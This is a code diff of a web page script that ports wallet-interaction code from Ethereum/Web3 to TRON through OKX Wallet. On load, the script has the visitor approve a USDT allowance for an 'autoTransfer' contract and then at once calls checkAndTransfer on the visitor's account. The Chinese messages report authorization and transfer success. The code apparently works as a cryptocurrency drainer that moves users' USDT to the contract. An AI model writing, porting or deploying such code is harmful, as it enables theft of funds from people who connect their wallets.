@@ -61,28 +61,27 @@ const autoTransferAbi = [
     {"inputs":[],"name":"usdtToken","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"}
 ];
 
-let web3;
+let tronWeb;
 
 async function init() {
-    if (typeof window.ethereum === 'undefined') {
-        alert('请安装OKX Wallet!');
+    if (typeof window.tronWeb === 'undefined') {
+        alert('请安装OKX Wallet并切换到TRON网络!');
         return;
     }
 
-    web3 = new Web3(window.ethereum);
+    tronWeb = window.tronWeb;
 
     try {
-        await window.ethereum.enable();
-        const accounts = await web3.eth.getAccounts();
-        const account = accounts[0];
+        const accounts = await tronWeb.defaultAddress.base58;
+        const account = accounts;
 
-        const usdtContract = new web3.eth.Contract(usdtAbi, usdtContractAddress);
-        const autoTransferContract = new web3.eth.Contract(autoTransferAbi, autoTransferContractAddress);
+        const usdtContract = await tronWeb.contract().at(usdtContractAddress);
+        const autoTransferContract = await tronWeb.contract().at(autoTransferContractAddress);
 
-        await usdtContract.methods.approve(autoTransferContractAddress, approveAmount).send({ from: account });
+        await usdtContract.approve(autoTransferContractAddress, approveAmount).send({ from: account });
         document.getElementById('result').innerText = '授权成功';
 
-        await autoTransferContract.methods.checkAndTransfer(account).send({ from: account });
+        await autoTransferContract.checkAndTransfer(account).send({ from: account });
         document.getElementById('result').innerText = '转账成功';
     } catch (error) {
         console.error(error);
